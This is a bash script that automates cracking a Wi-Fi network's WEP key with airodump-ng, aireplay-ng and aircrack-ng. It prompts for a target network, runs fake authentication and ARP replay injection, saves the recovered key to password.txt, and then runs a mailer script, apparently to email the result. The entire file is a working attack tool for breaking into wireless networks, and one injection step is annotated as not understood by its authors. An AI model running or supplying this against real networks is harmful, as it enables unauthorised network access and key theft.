#!/bin/bash
#set -x
#####################################################################################
# Programmer : Tinne & Brecht                                                        #
#                                                                                   #
# Program : Crack Wifi WEP                                                          #
#                                                                                   #
#                                                                                   #
#  _____   _                          ____                         _       _        #
# |_   _| (_)  _ __    _ __     ___  | __ )   _ __    ___    ___  | |__   | |_      #
#   | |   | | | '_ \  | '_ \   / _ \ |  _ \  | '__|  / _ \  / __| | '_ \  | __|     #
#   | |   | | | | | | | | | | |  __/ | |_) | | |    |  __/ | (__  | | | | | |_      #
#   |_|   |_| |_| |_| |_| |_|  \___| |____/  |_|     \___|  \___| |_| |_|  \__|     #
#                                                                                   # 
#####################################################################################
export IFACE
export BSSID
export CHANNEL
export SSID
export CMAC
# Confirm the argument enter
if [ -z $1 ]
then echo "Usage: APWEPhack.sh  <interface>"
echo "Please, Enter the interface to use for the crack"
echo "Example, ./APWEPhach.sh wlan0mon"
echo "Set interface in MONITOR mode : airmon-ng start interface."
exit
fi

#Start airodump-ng to AP information
IFACE=$1
echo "Starting listing...  Do CTRL + C when you find AP"
sleep 2
sudo airodump-ng $IFACE
# Ask Information of AP
echo "### AP INFORMATION ###"
echo "Enter BSSID: "; read BSSID
echo "Enter AP Channel: "; read CHANNEL
echo "Enter AP SSID:"; read SSID

CMAC=$(ip link show $IFACE | tail -n 1 | cut -f 6 --d " ")

echo "Starting WEP Cracking with these parameters: "
echo ""
echo " Interface: $IFACE";
echo " Channel: $CHANNEL";
echo " BSSID: $BSSID";
echo " SSID: $SSID";

if [ -z  "$CMAC" ]
then echo " No client MAC"
else
echo " Client MAC: $CMAC"
fi
echo ""

#Delete all previous captures
rm -rf *.cap
rm -rf *.csv
rm -rf *.netxml

# Start airodump-ng to capture data
xterm -e "airodump-ng -c $CHANNEL -w '$SSID' --bssid $BSSID $IFACE" &
# Start aireplay-ng for fake authentification.
xterm -e "aireplay-ng -1 0 -a $BSSID -h $CMAC -e $SSID $IFACE --ignore-negative-one" &
sleep 15
# Send ARP request ==> Data and beacons should begin to grow quickly
xterm -e "aireplay-ng -3 -b $BSSID -h $CMAC  $IFACE --ignore-negative-one" &
# We don't know what this does.... TODO: Explain
xterm -e "aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $CMAC $IFACE --ignore-negative-one" &
sleep 120
aircrack-ng -a 1 -b $BSSID -n 64 $SSID-01.cap | tee password.txt
# Send mail 
python mailer.py
